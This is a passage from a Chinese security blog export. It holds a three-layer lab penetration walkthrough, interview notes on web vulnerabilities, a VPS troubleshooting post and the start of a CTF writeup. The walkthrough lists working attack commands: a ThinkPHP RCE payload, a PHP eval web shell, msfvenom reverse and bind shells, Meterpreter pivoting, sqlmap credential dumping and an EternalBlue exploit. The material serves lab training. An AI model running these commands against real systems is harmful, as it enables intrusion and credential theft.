seconds\n```\n可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。\n\n2、既然存在http服务，那就用浏览器打开看看是个什么\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png)\n3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下\n```\n/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png)\n4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png)\n5、在工具中命令是可以被执行的，那就getshell吧\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png)\n6、昂~ getshell失败，没关系，直接echo写入一句话\n```bash\necho \"<?php @eval($_POST['TeamsSix']);?>\" > shell.php\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png)\n7、通过浏览器访问，查看shell.php是否上传成功\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png)\n8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png)\n```\n之前：<?php @eval($_POST['TeamsSix']);?>\n之后：<?php @eval(['TeamsSix']);?>\n```\n\n9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试\n```bash\necho \"PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==\" | base64 -d > shell.php\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png)\n10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png)\n## b、设置代理\n>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。\n\n1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件\n```bash\nroot@kali:~# ifconfig\nroot@kali:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf >shell.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png)\n2、在kali中配置运行监听模块\n```bash\nroot@kali:~# msfconsole\nmsf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > set lhost 0.0.0.0\nmsf5 exploit(multi/handler) > set lport 6666\nmsf5 exploit(multi/handler) > options\nmsf5 exploit(multi/handler) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png)\n3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行\n```bash\n(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf\n(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png)\n4、此时MSF获取到shell，通过meterpreter添加第二层的路由\n```bash\nrun autoroute -s 192.168.22.0/24\nrun autoroute -p\n\n这一步也可以使用run post/multi/manage/autoroute自动添加路由\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png)\n5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4\n```bash\nmsf5 > use auxiliary/server/socks4a\nmsf5 auxiliary(server/socks4a) > set srvport 2222\nmsf5 auxiliary(server/socks4a) > options\nmsf5 auxiliary(server/socks4a) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png)\n6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理\n```bash\nroot@kali:~# vim /etc/proxychains.conf\n加入以下内容：\nsocks4 \t192.168.1.113 \t2222\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png)\n7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置\n```bash\nroot@kali:~# proxychains4 nmap -Pn -sT 192.168.22.22\n-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。\n-sT：扫描TCP数据包已建立的连接connect\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png)\n# 0x03 Target2\n## a、获取shell\n1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png)\n2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png)\n3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧\n```bash\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png)\n4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库\n```bash\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword --dbs\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png)\n5、看看bagecms下有哪些表\n```bash\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword -D bagecms --tables\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png)\n6、看一下bage_admin下的内容\n```bash\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword -D bagecms -T bage_admin --columns\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png)\n7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行\n```bash\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword -D bagecms -T bage_admin -C username,password --dump\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png)\n8、找到我们想要的了，登陆后台，看看有哪些功能\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png)\n9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png)\n10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png)\n## b、设置代理\n1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门\n```bash\nroot@kali:~# msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf > shell2.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png)\n2、利用蚁剑将shell2.elf上传到Target2并开启监听\n```bash\n(www:/www/wwwroot/upload) $ chmod 777 shell2.elf\n(www:/www/wwwroot/upload) $ ./shell2.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png)\n\n3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。\n```bash\nmsf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp\nmsf5 exploit(multi/handler) > set RHOST 192.168.22.22\nmsf5 exploit(multi/handler) > set LPORT 4321\nmsf5 exploit(multi/handler) > options\nmsf5 exploit(multi/handler) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png)\n4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可\n```bash\nrun autoroute -s 192.168.33.0/24\nrun autoroute -p\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png)\n5、尝试扫描Target3\n```bash\nroot@kali:~# proxychains4 nmap -Pn -sT 192.168.33.33\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png)\n# 0x03 Target3\n## a、获取shell\n1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试\n```bash\nmsf5 > use exploit/windows/smb/ms17_010_psexec\nmsf5 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/bind_tcp\nmsf5 exploit(windows/smb/ms17_010_psexec) > set RHOST 192.168.33.33\nmsf5 exploit(windows/smb/ms17_010_psexec) > options\nmsf5 exploit(windows/smb/ms17_010_psexec) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png)\n\n2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序\n```bash\nmeterpreter > shell\nC:\\Windows\\system32>net user\nC:\\Windows\\system32>net user Administrator 123\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png)\n# 0x04 总结\n到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。\n这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：\n\n1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看\n2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的\n3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功\n4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可\n5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功\n6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的\n7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌\n\n>参考文章：\n>http://zerlong.com/512.html\n>https://www.anquanke.com/post/id/170649\n>https://www.anquanke.com/post/id/164525\n>https://blog.csdn.net/qq_36711453/article/details/84977739\n>这些文章在很大程度上帮助了我这个菜鸟，在这里向以上文章的作者表示感谢。\n\n>本文首发地址：https://www.anquanke.com/post/id/187908\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["内网渗透","CFS","比赛"],"categories":["实例演示"]},{"title":"经过一场面试，我发现我还存在这些不足","url":"/year/191014-090745.html","content":"\n# 0x00 前言\n最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。\n\n这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西，所以本篇文章我想记录一下这次面试过程中哪些自己不太了解的知识点。\n<!--more-->\n\nPS：\n\n1、面试中有的问题现在已经记得不是很深刻了，所以我想起来多少就记录多少咯。\n\n2、因为引用的文章内容都比较多，所以本文只提到了一些概念性的东西，关于每个知识点具体的详情有想看的小伙伴就自己在参考资料里面去找吧，嘿嘿 [狗头保命]\n\n# 0x01 SSRF和CSRF的概念以及区别\n这个知识点就属于以前有了解，但是平时很少接触以至于遗忘的类型，同时在笔试的时候就有提到这个点，笔试结束后我还特意查了一下，但是面试的时候却没有答上来，有点尴尬，下面就引用CSDN和知乎里两篇文章的描述，此处引用的文章地址为本文参考资料1和2。\n\n## CSRF\nCSRF又称跨站请求伪造，XSS就是CSRF中的一种。二者区别是XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。\n\n简单来说，CSRF是通过第三方网站伪装成正常用户登录目标网站，并以正常用户的身份对用户账号进行操作，以达到目的，CSRF攻击原理流程如下图。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi1.png)\n\n防御：\n\n1、增加验证码机制，增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过。\n\n2、验证referer,采用同源政策，referer记录着数据包的来源地址，来判断请求的合法性，但是这个可以伪造。\n\n3、使用Token，令牌是一种将表单value的加密算法生成不同的加密结果，在服务器端进行验证。\n\n4、在访问登录过一个网站，点击退出账户。\n\n总结：\n\n一次CSRF攻击成功实施，至少需要4个条件：\n\n1、被害用户已经进行过WEB身份认证，并留有Cookie\n\n2、新提交的请求无需重新进行身份认证或确认机制\n\n3、攻击者了解WEB请求的参数构造\n\n4、通过社交工程学诱使用户触发攻击的指令\n\n## SSRF\nSSRF又名服务端请求伪造攻击，如果把CSRF理解成客户端伪造请求攻击，它是利用用户本地的Cookie骗过服务器端的验证达到目的，而SSRF则是利用服务器天然能够访问内部网络的特点，进行攻击。\n\n由此可以得出，SSRF的受害对象主要是一些服务器所连接的一些内网设备，如内网的应用程序，通过file协议获得内部网络的资料等。SSRF攻击常见于一些允许以URL作为参数，且未对URL进行过滤的服务器。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi2.png)\n\n如上图，若URL是正常的第三方服务器，则URL会过滤通过。若URL是带有命令操作的服务器端A，且绕过了服务器端A的过滤，则服务器端A会执行URL带有的命令，并将结果返回会客户端，由此一次SSRF攻击成功。\n\n防御：\n\n从以上我们可以得出，该漏洞产生的原因是由于服务端对资源进行请求的时候对URL的验证出现了纰漏，所以我们的防护策略主要是围绕URL的过滤。\n\n1、将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。\n\n2、建立URL白名单，只允许白名单上内容通过过滤。\n\n3、建立内网IP黑名单，阻止对该IP的请求。\n\n4、对返回内容进行过滤，减少敏感内容暴露。\n\n5、禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。\n\n总结：\n\n一次成功的SSRF需要2个条件：\n\n1、攻击者知道服务器端的内网地址\n\n2、服务器端未对请求URL进行过滤或过滤不完全\n\n# 0x02 SQL注入的类型以及防御\n## 类型\n这里采用看雪的一篇文章，此处引用的文章地址为本文参考资料3。\n\n1、常见的sql注入按照参数类型可分为两种：数字型和字符型。\n\n \n\n当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。\n\n \n\n2、也可以根据数据库返回的结果，分为三种：回显注入、报错注入、盲注。\n\n \n\n回显注入：可以直接在存在注入点的当前页面中获取返回结果。\n\n \n\n报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。\n\n \n\n盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。\n\n \n\n3、按照注入位置及方式不同分为以下几种：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论此种分类如何多，都可以归纳为以上两种形式。\n\n## 防御\n这里采用知乎上的一个问答，此处引用的文章地址为本文参考资料4。\n\n问：\n\n如何从根本上防止 SQL 注入？\n\nSQL注入导致的安全问题数不胜数，为什么这么多年来同样的问题一再发生？\n\n如果是因为SQL脚本拼接的原因，为什么不在新的实现中采用api调用的方式来杜绝漏洞？\n\n答：\n\nSQL注入并不是一个在SQL内不可解决的问题，这种攻击方式的存在也不能完全归咎于SQL这种语言，因为注入的问题而放弃SQL这种方式也是因噎废食。首先先说一个我在其他回答中也曾提到过的观点：**没有（运行时）编译，就没有注入。**\n\nSQL注入产生的原因，和栈溢出、XSS等很多其他的攻击方法类似，就是未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。针对于SQL注入，则是用户提交的数据，被数据库系统编译而产生了开发者预期之外的动作。也就是，SQL注入是用户输入的数据，在拼接SQL语句的过程中，超越了数据本身，成为了SQL语句查询逻辑的一部分，然后这样被拼接出来的SQL语句被数据库执行，产生了开发者预期之外的动作。\n\n所以从根本上防止上述类型攻击的手段，还是避免数据变成代码被执行，时刻分清代码和数据的界限。而具体到SQL注入来说，被执行的恶意代码是通过数据库的SQL解释引擎编译得到的，所以只要**避免用户输入的数据被数据库系统编译**就可以了。\n\n至于如何避免用户输入的数据被数据库系统编译，我觉着可以参考CSDN上的一篇文章，详见本文参考资料5，该文具体说了以下内容：\n\n1、escape处理\n\n2、使用预编译语句\n\n3、使用存储过程\n\n4、检查数据类型\n\n5、使用安全函数\n\n# 0x03 XXE攻击的概念\n这个我不确定当时面试有没有问，不过刚才突然想到了，而且自己对XXE攻击也不是很了解，所以就简单记一下吧，此处引用的文章地址为本文参考资料6。\n\n在介绍xxe漏洞前，先学习温顾一下XML的基础知识。\n\nXML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。\n\n由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。\n\n文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。\n\n实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体根据引用方式，还可分为内部实体与外部实体，xxe漏洞主要是利用了DTD引用外部实体导致的漏洞。\n\nXXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。如果是linux下，可以读取/etc/passwd等目录下敏感数据。\n\nXXE的漏洞检测：\n\n1、检测XML是否会被成功解析\n\n2、检测服务器是否支持DTD引用外部实体，如果支持引用外部实体，那么很有可能是存在xxe漏洞的。\n\nXXE的修复与防御：\n\n1、使用开发语言提供的禁用外部实体的方法\n\n2、过滤用户提交的XML数据\n\n# 0x04 DDOS的类型\n说到DDOS，我的第一反应就是TCP SYN泛洪攻击，对于其他的类型却了解很少，所以这里也同样记录一下，此处引用的文章地址为本文参考资料7。\n\n首先有两类最常见的 DDoS 攻击，一是资源耗尽型；二是导致异常型，接下来就概要的说一下。\n\n1、SYN Flood攻击即洪水攻击是通过TCP建立3次握手连接的漏洞产生，主要通过发送源IP虚假的SYN报文，使目标主机无法与其完成3次握手，因而占满系统的协议栈队列，致使资源得不到释放，进而达成拒绝服务的目的，SYN Flood攻击是移动互联网中DDoS攻击最主要的形式之一。\n\n2、ACK Flood是对虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如SYN Flood。属于原始方式的DDoS攻击。 \n\n3、UDP Flood是使用原始套接字伪造大量虚假源IP的UDP包，主要以DNS协议为主。 \n\n4、ICMP Flood 即Ping攻击，是一种比较古老的方式。\n\n5、CC攻击即ChallengeCollapsar挑战黑洞，主要通过大量的肉鸡或者寻找匿名代理服务器，模拟真实的用户向目标发起大量的访问请求，导致消耗掉大量的并发资源，使网站打开速度慢或拒绝服务。现阶段CC攻击是应用层攻击方式之一。 \n\n6、DNS Flood主要是伪造海量的DNS请求，用于掩盖目标的DNS服务器。 \n\n7、慢速连接攻击是针对HTTP协议，以slowloris攻击为起源，然后建立HTTP连接，设置一个较大的传输长度，实际每次发送很少字节，让服务器认为HTTP头部没有传输完成，因此数据传输越多就会造成连接资源耗尽。 \n\n8、DOS攻击利用一些服务器程序的bug、安全漏洞、和架构性缺陷，然后通过构造畸形请求发送给服务器，服务器因不能判断处理恶意请求而瘫痪，造成拒绝服务。 \n\n# 0x05 跨域请求的概念\n以前记得在哪里有看到过这个，但是现在已经忘的差不多了，因此再复习复习，此处引用的文章地址为本文参考资料8。\n\n同源是指相同的协议、域名、端口，三者都相同才属于同源。同源策略浏览器出于安全考虑，在全局层面禁止了页面加载或执行与自身来源不同的域的任何脚本，站外其他来源的脚本同页面的交互则被严格限制。\n\n跨域由于浏览器同源策略，凡是发送请求url的协议、域名、端口三者之间任意一与当前页面地址不同即为跨域。\n\n看看哪些情况下属于跨域访问：\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi3.png)\n\n# 0x06 Linux的日志文件位置\n讲道理，在面试前几天我在搭建一个三层靶机的环境，当时还查过Linux的日志文件位置的文章，但是在面试的时候却忘掉了，这就有点难受了，所以再记录一下吧，此处引用的文章地址为本文参考资料9。\n\n```\n/var/log/messages   ：常规日志消息\n/var/log/boot       ：系统启动日志\n/var/log/debug      ：调试日志消息\n/var/log/auth.log   ：用户登录和身份验证日志\n/var/log/daemon.log ：运行squid，ntpd等其他日志消息到这个文件\n/var/log/dmesg      ：Linux内核环缓存日志\n/var/log/dpkg.log   ：所有二进制包日志都包括程序包安装和其他信息\n/var/log/faillog    ：用户登录日志文件失败\n/var/log/kern.log   ：内核日志文件\n/var/log/lpr.log    ：打印机日志文件\n/var/log/mail.*     ：所有邮件服务器消息日志文件\n/var/log/mysql.*    ：MySQL服务器日志文件\n/var/log/user.log   ：所有用户级日志\n/var/log/xorg.0.log ：X.org日志文件\n/var/log/apache2/*  ：Apache Web服务器日志文件目录\n/var/log/lighttpd/* ：Lighttpd Web服务器日志文件目录\n/var/log/fsck/*     ：fsck命令日志\n/var/log/apport.log ：应用程序崩溃报告/日志文件\n/var/log/syslog     ：系统日志\n/var/log/ufw        ：ufw防火墙日志\n/var/log/gufw       ：gufw防火墙日志\n```\n# 0x07 Linux的各目录含义\n这个是以前大一大二的时候学的了，现在只记住了平时经常用的那几个目录，所以当时感觉回答的并不是很好，因此这里也简单记录一下，此处引用的文章地址为本文参考资料10。\n\n```\n/bin   重要的二进制 (binary) 应用程序\n/boot  启动 (boot) 配置文件\n/dev   设备 (device) 文件\n/etc   配置文件、启动脚本等 (etc)\n/home  本地用户主 (home) 目录\n/lib   系统库 (libraries) 文件\n/media 挂载可移动介质 (media)\n/mnt   挂载 (mounted) 文件系统\n/opt   提供一个供可选的 (optional) 应用程序安装目录\n/proc  特殊的动态目录\n/root  root (root) 用户主文件夹，读作“slash-root”\n/sbin  重要的系统二进制 (system binaries) 文件\n/srv   服务（serve）文件\n/sys   系统 (system) 文件\n/tmp   临时(temporary)文件\n/usr   包含绝大部分所有用户(users)都能访问的应用程序和文件\n/var   经常变化的(variable)文件，诸如日志或数据库等\n```\n# 0x08 总结\n暂时印象较深的也就想到这些了，说实话，虽然看着这篇文章记下了很多东西，但是我感觉自己脑子里还是没有记住多少东西，这些东西还是要经常去用才能记得住呀，平时不去用不去碰真的太容易忘了。通过这次面试也认识到自己的很多不足，所以不管最后面试结果怎么样，自己有收获就好，毕竟就像新东方唐叔说的：能力的提升不在于你做了多少道题，而在于你做了多少总结。\n\n我觉着这句话再衍生一下就是能力的提升在于总结两个字，也就是说我自己犯了这些错误，有没有去总结，如果总结又总结了多少？而我觉着这些总结正是单属于我自己的宝贵财富，好了，不瞎扯了，感觉马上都变成鸡汤了 [ 笑哭 ]\n\n参考资料：\n\n>1、https://zhuanlan.zhihu.com/p/28657325\n>2、https://blog.csdn.net/pygain/article/details/52912521\n>3、https://www.kanxue.com/book-6-110.htm\n>4、https://www.zhihu.com/question/22953267\n>5、https://blog.csdn.net/hitwangpeng/article/details/45534787\n>6、https://thief.one/2017/06/20/1/\n>7、http://blog.itpub.net/69925937/viewspace-2647388/\n>8、https://blog.csdn.net/haozhoupan/article/details/51151656\n>9、https://blog.csdn.net/qq_33571718/article/details/78373653\n>10、https://www.jianshu.com/p/43f6785e0589\n>感谢以上文章的作者，如有侵权，烦请于我的公众号TeamsSix进行私信联系。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["总结","面试"],"categories":["经验总结"]},{"title":"【经验总结】VPS欠费后Hexo博客521无法访问","url":"/year/191009-164624.html","content":"# 0x00 前言\n最近自己博客的VPS欠费了，但是充值之后，启动VPS发现博客依旧无法访问，经过多次排查后，最后的结果真的是哭笑不得，下面就记录一下我最后的解决办法。\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_1.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_2.png)\n# 0x01 排查过程\n排查的过程中，碰到的第一个问题就是我发现SSH连接不上了，第一反应是博客被黑了？之后修改密码后才登上，估计只是我忘记密码了吧\n之后又发现hexo同步本地数据同步不上去，怎么搞都不行，之后过了一天，发现又可以同步了，这……玄学问题？\n直到博客无法访问第三天，我到网上四处找寻结果，还是没找到我碰到的这个问题，最后突然看到有人提到hexo使用的是nginx网页服务器，这才恍然大悟，我博客的nginx没有开！\n# 0x02 解决步骤\n直接进入自己VPS的命令行输入nginx开启nginx服务就行了，之后如果不放心可以输入netstat -ant看看自己的80端口有没有开。\n```bash\n[root@VPS_name ~]# nginx\n[root@VPS_name ~]# netstat -ant\n```\n# 0x03 一点思考\n讲道理，最后发现是这样的一个原因，还是挺尴尬的，博客自从搭建好后，几个月都没有碰过这些环境的问题，以前VPS重启nginx也是自动开启的，这次不知道为什么突然不行了，同时也感觉到有些东西长时间不碰，即使当初看着多么简单的东西也变难了起来。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["经验总结","VPS","Hexo"],"categories":["经验总结"]},{"title":"【CTF】记录一次CTF比赛的Writeup","url":"/year/190925-114420.html","content":"# 0x00 前言\n最近因为省赛快来了，因此为实验室的小伙伴准备了这次比赛，总共10道题目，考虑到大多数小伙伴都刚从大一升到大二，因此整体难度不高，当然有几道难度还是有的。\n\n题目大多数都是从网上东找西找的，毕竟我也是个菜鸟呀，还要给他们出题，我太难了。\n\n废话不多说，直接上Writeup吧，以下题目的文件下载地址可以在我的公众号（TeamsSix）回复CTF获取。\n<!--more-->\n\n# 0x01 隐写 1\n```\nflag：steganoI\n\nflag格式：passwd:\n\n题目来源：http://www.wechall.net/challenge/training/stegano1/index.php\n```\n签到题，下载题目图片，利用记事本打开即可看到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf1.png)\n\n# 0x02 隐写 2\n```\nflag：teamssix\n\nHint:一般在公共场合才能看的见\n\n题型参考：http://www.wechall.net/challenge/connect_the_dots/index.php\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf2.png)\n打开图片，参考题目提示说一般在公共场合才能看见，因此通过盲文对照表可以得出flag是teamssix，图片中的AXHU只是用来干扰的，这道题也是我参考wechall里面的一道题型。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf3.png)\n\n# 0x03 Web 1\n```\nflag:iamflagsafsfskdf11223\n\nHint:站内有提示\n\n题目地址：\nhttp://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php\n参考来源：http://hackinglab.cn/ShowQues.php?type=sqlinject\n```\n1、打开题目地址\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf4.png)\n2、查看源码找到提示\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf5.png)\n3、根据提示使用admin登陆，并使用弱密码\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf6.png)\n4、尝试多次都提示失败，利用万能密码再做尝试，找到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf7.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf8.png)\n\n# 0x04 Web 2\n```\nflag:76tyuh12OKKytig#$%^&\n\n题目地址：http://lab1.xseclab.com/upload3_67275a14c1f2dbe0addedfd75e2da8c1/\n\nflag格式：key is :\n\n题目来源：http://hackinglab.cn/ShowQues.php?type=upload\n```\n1、打开题目地址，发现是一个文件上传界面\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf9.png)\n2、先把Burp挂上，随便上传一个JPG图片试试，并来到Burp重发这个包\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf10.png)\n3、在Burp中对文件名进行修改，比如在jpg后加上.png或者其他东西，成功看到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf11.png)\n\n# 0x05 